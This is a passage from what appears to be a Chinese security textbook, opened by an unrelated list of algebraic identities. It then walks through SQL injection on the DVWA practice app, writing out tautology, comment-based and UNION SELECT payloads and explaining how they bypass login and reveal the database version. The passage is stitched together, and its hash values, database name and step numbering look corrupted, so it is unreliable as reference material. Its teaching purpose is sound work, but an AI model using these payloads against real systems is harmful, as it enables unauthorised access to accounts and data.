

## 常见代数恒等式

- **和的平方：** $(a+b)^2 = a^2 + 2ab + b^2$
- **差的平方：** $(a-b)^2 = a^2 - 2ab + b^2$
- **平方差：** $a^2 - b^2 = (a+b)(a-b)$
- **和的立方：** $(a+b)^3 = a^3 + 3a^2b + 3ab^2 + b^3$
- **差的立方：** $(a-b)^3 = a^3 - 3a^2b + 3ab^2 - b^3$
- **立方差：** $a^3 - b^3 = (a-b)(a^2 + ab + b^2)$
- **立方和：** $a^3 + b^3 = (a+b)(a^2 - ab + b^2)$

```
MariaDB [dowa]> SELECT * FROM users;
```

| user_id | first_name | last_name | user | password | avatar | last_login | failed_login |
|---|---|---|---|---|---|---|---|
| 1 | admin | admin | admin | 5f4dc3b5aae56fd61d8327db882cf99 | /dowa/hackable/users/admin.jpg | 2020-07-06 10:54:50 | 0 |
| 2 | Gordon | Brown | gordonb | e7918c48c38d5120e853679822e03 | /dowa/hackable/users/gordonb.jpg | 2020-07-06 10:54:50 | 0 |
| 3 | Hack | Me | 1337 | 8433e3347e2c3966d0e044ccf9216b | /dowa/hackable/users/1337.jpg | 2020-07-06 10:54:50 | 0 |
| 4 | Pablo | Picasso | pablo | 80107a09f3b5be40cdd3e5d7169e9b7 | /dowa/hackable/users/pablo.jpg | 2020-07-06 10:54:50 | 0 |
| 5 | Bob | Smith | smithy | 5f4dc3b5aae56fd61d8327db882cf99 | /dowa/hackable/users/smithy.jpg | 2020-07-06 10:54:50 | 0 |

5 rows in set (0.001 sec)

```
MariaDB [dowa]>
```

如下所示：

```sql
SELECT first_name 'First name', last_name Surname FROM
users WHERE user_id =
'$ID_SUBMISSION' AND password =
hashFunction('PW_SUBMISSION');
```

这假设提交的密码会被哈希，并且哈希值会被放入查询中。

![](img/6e921d997751f0a0f87e5170ac9657a1_693_0.png)

### 第 5 步

在浏览器的 DVWA 漏洞：SQL 注入页面上，在 User ID 输入框中输入 3，然后点击 Submit 按钮。注意，现在显示的是用户 Hack Me 的信息。实际执行的查询似乎是：

```sql
SELECT first_name 'First name', last_name Surname FROM
users WHERE user_id = '3';
```

现在，在一对单引号之间插入的是 3 而不是 1，这就是我们看到这条特定记录的原因。

![](img/6e921d997751f0a0f87e5170ac9657a1_693_1.png)

### 第 6 步

现在大胆一点，在 User ID 文本框中输入以下内容（注意，w 可以是任意字符）：

```sql
w' OR '1' = '1
```

实际执行的查询似乎是：

```sql
SELECT first_name 'First name', last_name Surname FROM
users WHERE user_id = 'w' OR '1' = '1';
```

这里的 w 是一个虚拟占位值，可以是任意字符，甚至可以不写。两个 1 也可以换成任意内容，同样也可以不写。因此输入甚至可以简单成这样：

```sql
' OR ' ' = '
```

再来看一下这个查询，我们对关键部分加粗，并对输入加下划线：

```sql
SELECT first_name 'First name', last_name Surname FROM
users WHERE user_id = 'w' OR '1' = '1';
```

输入在分号之前结束。这是因为 SQL 语句总是会把引号放在这些位置。w 后面的单引号终止了 user_id 字符串，而 SQL 放在分号前的单引号则终止了等值比较右侧的内容。

![](img/6e921d997751f0a0f87e5170ac9657a1_695_0.png)

### 第 7 步

如果存在密码字段，并且用户名字段中填入了任意内容，那么输入可能是这样的：

```sql
password' OR '1' = '1'
```

简化后的查询可能是这样的：

```sql
SELECT id FROM users WHERE username = 'username' AND password = 'password' OR '1' = '1'
```

AND 会先被处理，因为输入的用户名和密码不正确，所以会产生一个 false。

现在查询被化简为：

```sql
SELECT id FROM users WHERE false OR '1' = '1'
```

之前的表达式已被化简为 false 值。

接下来计算 OR。OR 左边是 false，右边是 true 条件，因此查询现在变成了：

```sql
SELECT id FROM users WHERE true
```

如果你确实是在向服务器提交这些值以登录，而不是使用这个 DVWA 程序，那么返回的将是表中创建的第一个用户 ID（而不是所有用户 ID），你将以此用户身份登录。通常第一个创建的用户是管理员，因此在 SQL 注入攻击中，你会以管理员权限登录。

如有必要，攻击者甚至可以注释掉查询的末尾部分，使其被忽略且仍保持语法正确；不同 RDBMS 使用的注释符号也各有不同，包括：--、/*、#。

![](img/6e921d997751f0a0f87e5170ac9657a1_695_1.png)

尝试输入以下内容。试试下面这些例子。

- b. `w' OR '1' = '1' AND first_name <> 'admin' AND first_name <> 'Gordon`
- c. `w' OR '1' = '1' AND first_name <> 'admin' AND first_name <> 'Gordon' and first_name <> 'Hack`
- d. `w' OR '1' = '1' AND first_name <> 'admin' AND first_name <> 'Gordon' and first_name <> 'Hack' AND first_name <> 'Pablo`
- e. `w' OR '1' = '1' AND first_name <> 'admin' AND first_name <> 'Gordon' and first_name <> 'Hack' AND first_name <> 'Pablo' AND first_name <> 'Bob`

在最后一个用户 Bob 之后，将不会返回任何内容。

### 交叉引用

这一过程与我们在第 7 章中逐步了解 DNS 区域的过程类似。

RDBMS 数据库的表（也称为关系）由行（也称为记录或元组）和列（也称为字段或属性）组成。行和列都不要求按特定顺序排列，但两者都可以进行排序和筛选。

![](img/6e921d997751f0a0f87e5170ac9657a1_697_0.png)

### 第 9 步

你还能用 SQL 注入做些什么？

UNION 运算符将伪造查询与原始查询连接起来。这使攻击者能够访问一些“幕后”元数据，并利用这些元数据发动更强大的攻击。如前所述，# 符号会注释掉查询的末尾部分。现在来看看如何将 UNION 语句与 # 符号结合使用。

UNION 通过组合两个或多个查询并去除重复行，返回一个结果集，其中包含属于多个查询的所有行。两个 SELECT 语句中的表达式数量必须相同，并且伪造查询必须放在特定位置。

```sql
' UNION SELECT VERSION(), NULL#
```

- https://mariadb.com/kb/en/union/
- https://mariadb.com/kb/en/version/
- https://mariadb.com/kb/en/null-values/

开始吧！看看输出：

```
ID: ' UNION SELECT VERSION(), NULL#
First name: 10.4.10-MariaDB
Surname:
```

完整查询是：

```sql
SELECT first_name 'First name', last_name Surname FROM users WHERE user_id = '' UNION SELECT VERSION(), NULL#' ;
```

由于 `user_id = ''` 这部分没有匹配数据库中的任何现有条目，原始查询没有为 first_name 或 last_name 产生任何结果。这些空白结果现在与我们放在表单字段中的查询结果合并在一起。SELECT VERSION() 函数调用会返回 RDBMS 的名称和版本，这些信息可用作侦察，以寻找针对该 RDBMS 的漏洞并加以利用。

d. 列的顺序并不重要，如下所示：

```sql
' UNION SELECT NULL, VERSION()#
```

完整查询是：

```sql
SELECT first_name 'First name', last_name Surname FROM users WHERE user_id = '' UNION SELECT NULL, VERSION()#' ;
```

e. 将这两个完整语句（来自第 9c 步和第 9d 步）输入 MariaDB 控制台，如图 19-14 所示。

